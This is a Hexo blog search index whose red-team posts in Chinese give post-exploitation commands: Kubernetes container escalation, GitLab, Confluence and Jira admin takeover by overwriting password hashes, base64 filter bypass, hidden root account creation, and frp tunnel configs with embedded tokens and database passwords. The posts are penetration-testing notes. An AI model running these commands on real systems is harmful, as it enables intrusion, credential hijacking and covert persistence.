[{"title":"test-blog2","path":"/2024/01/25/test-blog2/","content":"hello11111 hello22222 hello33333 hello44444 hello55555 hello666666"},{"title":"test-blog","path":"/2024/01/25/test-blog/","content":"hello111222 222333 whoami4444396 5555678 whoareyou1234","tags":["PS3","Games"],"categories":["Diary","PlayStation","Games","Life"]},{"title":"Hello World","path":"/2024/01/23/hello-world/","content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot; More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment"},{"title":"项目中的渗透后利用小结","path":"/2023/12/15/项目中的渗透后利用小结/","content":"内网主机信息收集在项目中有遇到拿到shell的情况下，看到主机名是gitlab或者是什么gitserver，通常都有k8s或者docker服务，先判断是本机启动的服务还是容器里面启动的服务，然后再到对应的地方找配置文件和数据库之类的，然后可以到应用内去找有价值的东西 可以看～&#x2F;.ssh&#x2F;底下的文件，有没有id_rsa，或者是看known_hosts曾经连接过一些什么机器，再看看&#x2F;etc&#x2F;hosts有没有给其他机器添加了解析，还有各种历史记录和配置文件也值得留意 12345678910~/.ssh/~/.bash_history/etc/hostsss -tl[n]\t#加-n参数不显示服务名，纯端口号netstat -anpps -auxf / ps -ef 看进程启动命令cat /proc/pid/environ 进程启动环境变量cat /proc/pid/cmdline 进程启动命令ls -al /proc/pid/exe\t进程可执行文件符号连接ls -al /proc/pid/fd 进程打开的文件（file descriptor） K8S当你在master节点，k8s也可以像docker一样exec 12345678910kubectl get pods #查看所有正在运行的podNAME READY STATUS RESTARTS AGEnginx-56b8c64cb4-t97vb 1/1 Running 3 1dkubectl exec -it nginx-56b8c64cb4-t97vb -- /bin/bash\t#假如当前pod只有一个容器,运行以下命令即可&lt;3&gt;假如一个pod里有多个容器,用--container or -c 参数。例如:假如这里有个Pod名为my-pod,这个Pod有两个容器,分别名为main-app 和 helper-app,下面的命令将打开到main-app的shell的容器里。kubectl exec -it my-pod --container main-app -- /bin/bash 但是很多时候exec进去都不是root账户，这个时候我们需要找到实际启动容器的机器去 12345678# 先找到pod的名称kubectl get pods # 获取容器kubectl get pods xxxx-xxx-001 # 查看容器信息kubectl get pods [-n] xxxx-xxx-001 -o wide # 定位节点机器，输入-n会报错# ssh到pod所在的节点ssh k8s-node2 # ssh连接docker ps -a | grep xxxx-xxx-001 # 查看docker容器docker exec -it -u root [CONTAINER_ID] /bin/bash # exec进入容器 GitLab代码仓库，看有没有重要系统的源码打包弄出来做代审 初始密码Gitlab 14安装初始化后，默认账户名是root,密码存放在配置文件 /etc/gitlab/initial_root_password 这个文件将在首次执行reconfigure后24小时自动删除，文件内容： 12345678910[root@gitlab ~]# cat /etc/gitlab/initial_root_password # WARNING: This value is valid only in the following conditions# 1. If provided manually (either via `GITLAB_ROOT_PASSWORD` environment variable or via `gitlab_rails[&#x27;initial_root_password&#x27;]` setting in `gitlab.rb`, it was provided before database was seeded for the first time (usually, the first reconfigure run).# 2. Password hasn&#x27;t been changed manually, either via UI or via command line.## If the password shown here doesn&#x27;t work, you must reset the admin password following https://docs.gitlab.com/ee/security/reset_user_password.html#reset-your-root-password.Password: NdaWiHzufnlWDshXY+xI52q4Br0x2O+mAsTeU6V1694=# NOTE: This file will be automatically deleted in the first reconfigure run after 24 hours. 修改管理员密码默认数据库应用是PostgreSQL，数据库是gitlabhq_production，表是users，管理员默认的id是1，用户名是root 通常docker拉起的gitlab都会有gitlab-rails，gitlab-psql一系列的应用 不考虑改回密码的情况1234567891011gitlab-rails consoleuser = User.find(1)new_password = &#x27;Aa12345678!&#x27;user.password = new_passworduser.password_confirmation = new_passworduser.save!user.attributes得到Aa12345678!密文就是这个，后面能用到&quot;encrypted_password&quot;=&gt;&quot;$2a$10$n6EWnwDjlab2YXrTc5ZdGu2OkwnE25qVS/tG2nHsvPGze5iPD317G&quot; 考虑改回密码的情况设置新密码为Aa12345678!，记得先查询一次保存旧密码的密文 1234567891011gitlab-psql\\l\\c gitlabhq_productionselect id,encrypted_password,name,username,admin from users where id=1;-- 这一步是将密码更新为Aa12345678!update users set encrypted_password=&#x27;$2a$10$n6EWnwDjlab2YXrTc5ZdGu2OkwnE25qVS/tG2nHsvPGze5iPD317G&#x27; where id=1;-- 这一步是恢复旧密码的密文update users set encrypted_password=&#x27;$2a$************************************vyy&#x27; where id=1; Confluence知识库系统，可以看有没有信息泄漏之类的东西 https://www.jianshu.com/p/7cc8ea59578a 默认配置文件位置：Linux： 1/var/atlassian/application/data/confluence/confluence.cfg.xml Windows： 1C:/Atlassian/Application/Data/Confluence/confluence.cfg.xml 数据库操作 12345678910111213141516171819202122mysql -uroot -pRadBank@530show databases;use confluence;select id,user_name,active,email_address,credential from cwd_user;-- 在数据库里面查看管理员用户select u.id, u.user_name, u.active from cwd_user u join cwd_membership m on u.id=m.child_user_id join cwd_group g on m.parent_id=g.id join cwd_directory d on d.id=g.directory_id where g.group_name = &#x27;confluence-administrators&#x27; and d.directory_name=&#x27;Confluence Internal Directory&#x27;; -- 记得存一下原始密码-- &#123;PKCS5S2&#125;xPqJ5enH/NPJfOyO2vUiQgoF0pRLl9R+HwxWC9zG3OjOXJbapmEl0+bEz/MelyLJ-- 原始密码明文是123456-- 无&#123;PKCS5S2&#125;的，更改密码为sphereupdate cwd_user set credential=&#x27;uQieO/1CGMUIXXftw3ynrsaYLShI+GTcPS4LdUGWbIusFvHPfUzD7CZvms6yMMvA8I7FViHVEqr6Mj4pCLKAFQ==&#x27; where user_name=&#x27;XXXX&#x27;;-- 有&#123;PKCS5S2&#125;的，更改密码为123456update cwd_user set credential=&#x27;&#123;PKCS5S2&#125;ms9AdSR9vnOXqnNdEmRG/kxRc22qTnx3Y/nwdyaNEg5/XAANouQ+akxcQbFjJiQ4&#x27; where user_name=&#x27;XXXX&#x27;;-- 密码是&#123;PKCS5S2&#125;前缀开头的，则用下面这个sql，这个管理员密码为 Ab123456update cwd_user set credential=&#x27;&#123;PKCS5S2&#125;ltrb9LlmZ0QDCJvktxd45WgYLOgPt2XTV8X7av2p0mhPvIwofs9bHYVz2OXQ6/kF&#x27; where id=xxxxxx; 用已知的密文进行替换 将管理员用户的密码修改为目前已知的明文密码的密文（不能直接在数据库中添加字段，否则在单个表中添加字段可能会出现问题）。 修改密码后，登陆后台，添加用户并将其加入管理员组。 最后，将管理员密码还原回去。 更改密码 登录后台——&gt;用户管理——&gt;添加用户——&gt;加管理员组——&gt;还原admin密码 参考文章：confluence后利用 Jira项目与事务跟踪工具，经常和confluence一起出现 123456789101112131415161718192021222324mysql -uroot -pRadBank@530show databases;-- Jira数据库中，用户信息都存放在表 cwd_user中-- 切换到jiar数据库-- CREDENTIAL字段是加密后的密码use jiradb;-- 看看管理员用户信息，待会会用到select id,user_name,active,email_address,credential from cwd_user;-- 记得保存原始密码，信息收集完成之后改回-- &#123;PKCS5S2&#125;dVBfve2TpngECXqQfQJJlnnfC9WwDB25vCaXlxvSy67m/Tv6NVNi29ON0PX5vvf0-- 这个密码的明文也是123456-- 无&#123;PKCS5S2&#125;的，更改密码为sphereupdate cwd_user set credential=&#x27;uQieO/1CGMUIXXftw3ynrsaYLShI+GTcPS4LdUGWbIusFvHPfUzD7CZvms6yMMvA8I7FViHVEqr6Mj4pCLKAFQ==&#x27; where user_name=&#x27;XXXX&#x27;;-- 有&#123;PKCS5S2&#125;的，更改密码为123456update cwd_user set credential=&#x27;&#123;PKCS5S2&#125;ms9AdSR9vnOXqnNdEmRG/kxRc22qTnx3Y/nwdyaNEg5/XAANouQ+akxcQbFjJiQ4&#x27; where user_name=&#x27;XXXX&#x27;;-- 有&#123;PKCS5S2&#125;的，更改密码为Ab123456update cwd_user set credential=&#x27;&#123;PKCS5S2&#125;ltrb9LlmZ0QDCJvktxd45WgYLOgPt2XTV8X7av2p0mhPvIwofs9bHYVz2OXQ6/kF&#x27; where id=xxxxxx;-- 最后记得复原密码update cwd_user set credential=&#x27;初始密码&#x27; where user_name=&#x27;XXXX&#x27;;"},{"title":"OS-Linux学习笔记","path":"/2023/02/28/linux/","content":"Linux学习文档大致情况：总结比赛和日常了解到的一些linux知识 查看主机信息参考文章：https://blog.csdn.net/qq_31278903/article/details/83146031 1234567891011ifconfiguname －a （Linux查看版本当前操作系统内核信息）cat /proc/version\t（Linux查看当前操作系统版本信息）cat /etc/issue\t或\tcat /etc/redhat-release（Linux查看版本当前操作系统发行版信息）cat /proc/cpuinfo 或 lscpu （Linux查看cpu相关信息，包括型号、主频、内核信息等）getconf LONG_BIT （Linux查看版本说明当前CPU运行在32bit模式下， 但不代表CPU不支持64bit）hostname （查看服务器名称）lsblk （查看磁盘信息 - 列出所有可用块设备的信息，而且还能显示他们之间的依赖关系，但是它不会列出RAM盘的信息）fdisk -l （观察硬盘实体使用情况，也可对硬盘分区）df -k （用于显示磁盘分区上的可使用的磁盘空间）echo $? # 输出上条指令的执行状态，0代表执行成功，其他数字执行失败 frp维护123netstat -anp |grep frp #查看frp连接情况/进程号ps -e |grep frp #查看frp进程lsof -i | grep frp #查看frp连接情况/进程号（更直观） 客户端Frpc.ini 123456789101112131415[common]server_addr = 远端ipserver_port = 11100token = QaXnB666!@##[ssh]#type = tcp#local_ip = 127.0.0.1#local_port = 22#remote_port = 16001[socks5]type = tcpplugin = socks5remote_port = 17891 服务端Frps.ini 1234567891011121314151617[common]bind_port = 11000dashboard_port = 11500dashboard_user = fr3nkydashboard_pwd = Fr3Nkyvhost_http_port = 9001max_pool_count = 50token = QaXnB666!@#tcp_mux = truelog_file = /root/frp/log/frps.loglog_level = infolog_max_days = 3authentication_timeout = 0 运行脚本frp.sh 123#! /bin/bashsleep 30/home/fr3nky/frp/frpc -c /home/fr3nky/frp/frpc.ini &gt;&gt; /home/fr3nky/frp/log.txt &amp; vi和vimyum&#x2F;apt install vim 编辑模式 (insert mode)，按下“i, o, a, r”等任何一个字母后进入编辑模式，出现 –insert– 命令行命令模式 (command-line mode)，输入“ : &#x2F; ? ”三个中的任何一个按钮，就可以将光标移动到最下面那一列 1234:wq! w: writeq: quit!: 强制 按键说明h 或 向左方向键(←)；j 或 向下方向键(↓)；j 或 向下方向键(↓)；l 或 向右方向键(→) 向下移动 30 列， 可以使用 “30j” 或 “30↓” 的组合按键 [Ctrl] + [f]：相当于 [Page Down] [Ctrl] + [b]：相当于 [Page Up] [Ctrl] + [d]：屏幕“向下”移动半页 [Ctrl] + [u]：屏幕“向上”移动半页 +：光标移动到非空白字符的下一列 -：光标移动到非空白字符的上一列 n&lt;space&gt;：那个 n 表示“数字”，例如 20 。按下数字后再 按空白键，光标会向右移动这一列的 n 个字 符。例如 20&lt;space&gt; 则光标会向后面移动 20 个字符距离。 0 或功能键[Home]：这是数字“ 0 ”:移动到这一列的最前面字符处 (常用) $ 或功能键[End]：移动到这一列的最后面字符处(常用) H：光标移动到这个屏幕的最上方那一列的第一个字符 M：光标移动到这个屏幕的中央那一列的第一个字符 G：移动到这个文件的最后一列(常用) nG：n 为数字。移动到这个文件的第 n 列。例如 20G 则会移动到这个文件的第 20 列(可配合 :set nu) gg：移动到这个文件的第一列，相当于 1G(常用) 查找在 normal 模式下按下 / 即可进入查找模式，输入要查找的字符串并按下回车。 Vim 会跳转到第一个匹配。按下 n 查找下一个，按下 N 查找上一个。 Vim 查找支持正则表达式，例如 /vim$ 匹配行尾的 &quot;vim&quot;。 需要查找特殊字符需要转义，例如 /vim\\$ 匹配 &quot;vim$&quot;。 注意查找回车应当用 ，而替换为回车应当用 \\r（相当于 &lt;CR&gt;）。 其他查找模式 ?（按住 Shift + /）往上查找。 q/ 查看查找历史，选中一项后回车可以重新查找。 q? 查看向上查找历史。 SELinux安全参考 鸟哥的linux私房菜 https://blog.csdn.net/weixin_42741132/article/details/82533665 https://blog.51cto.com/u_13570193/2093299 Security Enhanced Linux SELinux 是通过 MAC【委任式存取控制 (Mandatory Access Control, MAC)】的方式来控管程序，他控制的主体是程序， 而目标则是该程序能否读取的“文件资源”。 修改文件的SELinux标签的命令：chcon ；restorecon 有待补充 &#x2F;proc（进程的状态信息）https://blog.csdn.net/juzihongle1/article/details/77184541 &#x2F;proc&#x2F;self&#x2F;cwd\t当前目录 &#x2F;proc&#x2F;pid&#x2F;cwd\t程序运行目录 &#x2F;proc&#x2F;pid&#x2F;cmdline\t程序运行指令 &#x2F;proc&#x2F;net&#x2F;arp\t读内网地址 … chattr&#x2F;lsattr 文件隐藏属性https://www.runoob.com/linux/linux-comm-lsattr.html https://www.runoob.com/linux/linux-comm-chattr.html 除了基本r, w, x权限外，在Linux传统的Ext2&#x2F;Ext3&#x2F;Ext4文件系统下，我们还可以设置其他的系统隐藏属性，其他的文件系统可能就无法完整的支持这个指令了，例如 xfs 仅支持部份参数而已。这部份可使用 chattr 来设置，而以 lsattr 来查看。 123456789101112131415161718[root@localhost SELearning]# ll test.txt-rw-r--r--. 1 root root 12 2月 28 18:05 test.txt[root@localhost SELearning]# ls -l test.txt-rw-r--r--. 1 root root 12 2月 28 18:05 test.txt[root@localhost SELearning]# lsattr test.txt---------------- test.txt[root@localhost SELearning]# chattr +i test.txt[root@localhost SELearning]# rm -f test.txtrm: 无法删除&quot;test.txt&quot;: 不允许的操作[root@localhost SELearning]# lsattr test.txt----i----------- test.txt[root@localhost SELearning]# chattr -i test.txt[root@localhost SELearning]# rm test.txtrm：是否删除普通文件 &quot;test.txt&quot;？n[root@localhost SELearning]# lstest.txt test.txt.bak[root@localhost SELearning]# lsattr test.txt---------------- test.txt 资源备份指令打包1tar -czvf src.tar.gz /var/www/html 下载1scp -P port user@ip:/dirName fileName 解包12tar -xzvf src.tar.gztar -xzvf src.tar.gz -C /home 上传1scp -P port fileName user@ip:/dirName 端口转发12345678910111213141516171819202122232425262728293031方法一(推荐):本地访问题目通过ssh进行端口转发命令：ssh -L 本地port:赛题IP:赛题port 操作机用户@操作机IP -p 操作机port实例：操作机资源为 202.10.10.123:45678 登录用户名dawd4321 密码00xx123赛题地址为：192.168.12.5:43215 本地空闲可使用端口为9999ssh -L 9999:192.168.12.5:43215 dawd4321@202.10.10.123 -p 45678 输入登录密码，登录成功10.0.100.230:4700147.106.187.217:40022dawd5069417a9557ssh -L 10001:10.0.100.230:47001 dawd506941@47.106.187.217 -p 40022在本地nc/telnet 127.0.0.1 9999即可以本地调试pwn题如果转发的是web题目，可以直接使用浏览器访问9999端口。方法二:通过操作机做跳板进行 socks5 代理进行访问本地 PC 执行命令:ssh -CqTnN -D localhost:15567(随便一个非常用端口) &#123;操作机账号&#125;@&#123;操作机地址&#125; -p &#123;操作机端口&#125; 回车后输入 操作机密码浏览器(以 firefox 为例)设置-首选项-网络设置-手动配置 代理-socks主机 127.0.0.1 端口 15567(刚才在ssh命令 中指定的非常用端口)浏览器地址栏输入 web 题的 内网地址:端口 即可访问题目系统全局代理配置方法相似，配之后无需进行浏览器代理配置即可全局访问内网题目地址 getshell危险指令绕过12345echo cGluZyB3d3cuYmFpZHUuY29t|base64 -d|bash如果bash禁用了 可以用$0如果$0是-bash 可以用 $&#123;0:1&#125;cGluZyB3d3cuYmFpZHUuY29t等于ping www.baidu.com 添加用户&#x2F;组，密码操作12345678910111213141516sudo adduser 用户名 #添加用户(有交互)sudo usermod -a -G sudo 用户名 #添加到sudo组，附带-a参数不改变用户基本组sudo gpasswd -a 用户名 docker #参数-a附加到docker组，用户的基本组保持不变sudo usermod -G 用户名 用户名 #只保留用户基本组id 用户名 #查看用户组useradd test114 添加用户（无交互）userdel test114 删除用户passwd -d test114删除密码echo test114:114514 | chpasswdecho -e &quot;114514&quot; |passwd test114# 一句话添加用户密码\t#普通账户useradd -p `openssl passwd -1 -salt &#x27;salt&#x27; 123456` guestuseradd -p &quot;$(openssl passwd -1 123456)&quot; guest\t#root账户，admin114514/Qaxnb@654!@#useradd -p `openssl passwd -1 -salt &#x27;ysxb114&#x27; Qaxnb@654\\!@#` -u 10086 -g root -G root -s /bin/bash -d /home/.admin admin114514 一句话找web目录123find / -type f -name config.js|while read f;do sh -c &quot;id;pwd;hostname;/sbin/ifconfig&quot; &gt;$(dirname $f)/test3.txt;doneecho ZmluZCAvIC10eXBlIGYgLW5hbWUgY29uZmlnLmpzfHdoaWxlIHJlYWQgZjtkbyBzaCAtYyAiaWQ7cHdkO2hvc3RuYW1lOy9zYmluL2lmY29uZmlnIiA+JChkaXJuYW1lICRmKS90ZXN0My50eHQ7ZG9uZQo= | base64 -d |sh curl如何在 Linux&#x2F;Unix 上使用带有代理用户名&#x2F;密码的 curl 命令要将 curl命令与需要用户名和密码的代理服务器一起使用，您可以使用 -x选项指定代理服务器，并使用 -U选项指定用户名和密码。 例如，要使用位于 proxy.example.com 的代理服务器以用户名 user 和密码 password 向 https://www.example.com 发送请求，您可以使用以下命令: 1curl -x proxy.example.com -U user:password https://www.example.com 这将使用位于 proxy.example.com 的代理服务器向 https://www.example.com 发送请求，并在请求中包含用户名和密码。 如果要在 http_proxy环境变量中指定代理服务器和用户名&#x2F;密码，可以使用 --proxy-user选项指定用户名和密码。 例如： 12export http_proxy=proxy.example.comcurl --proxy-user user:password https://www.example.com 这会将“http_proxy”环境变量设置为“proxy.example.com”，并在请求中包含用户名和密码。 请记住，-x和 --proxy-user选项与用于跟随重定向的 -L选项不兼容。如果您需要遵循重定向，则可以改用“–location-trusted”选项。"},{"title":"戴尔EMC服务器重装系统","path":"/2022/03/12/戴尔EMC服务器重装系统/","content":"写在前面前言手贱用apt-get autoremove把一些重要的依赖删了，导致GUI没了，并且装不回来，遂重装系统。 准备DELL EMC PowerEdge T440，U盘（容量大于镜像文件），键盘，屏幕，鼠标，操作系统镜像。 戴尔这个服务器主机自带的管理软件还是比较完善的，而且功能也还算清晰， 参考文章： 参考文章： 如何在 Dell PowerEdge 服务器上安装操作系统 戴尔服务器专业知识：在PowerEdge上安装操作系统 如何使用Rufus创建可引导的USB设备以更新戴尔服务器 U盘准备先在ubuntu官网下载需要的镜像，我下载的是20.04-server 用Rufus将下载好的镜像烧录进USB设备 工具下载地址：https://rufus.ie/zh/ 这一步就准备好U盘了 服务器部分开机出现服务器界面是按F2先把之前的分区给删了，重新配置一次RAID，网上有教程，下面给出链接参考 https://blog.csdn.net/qq_16128855/article/details/105842286 然后F11设置启动项，将刚刚插入的U盘设置为启动盘，教程链接 https://www.cnblogs.com/love-sherry/p/7216242.html 重启，按照正常安装ubuntu的流程来安装就好了"},{"title":"OS-Windows学习笔记","path":"/2021/02/08/windows/","content":"记录一些Windows操作系统的学习内容 powershell查找文件名 1Get-ChildItem -Path C:\\ -Recurse -Name flag*"},{"title":"About","path":"/about/index.html","content":"关于本站个人博客，啥都会放上来，技术工作生活娱乐发牢骚，更新频率极度不稳定，可能会是涓涓细流，也可能是一泻千里，笑一笑就好^^_ 關於我乜人Cantonese GDUFS CyberSecurity 點搵常用ID：Fr3Nky Email：frenkyxy0246@gmail.com GitHub：https://github.com/FrenkyOHOHOH/ 做乜CTF&#x2F; RedTeam&#x2F; Web&#x2F; Misc 人生規劃Carpe diem"}]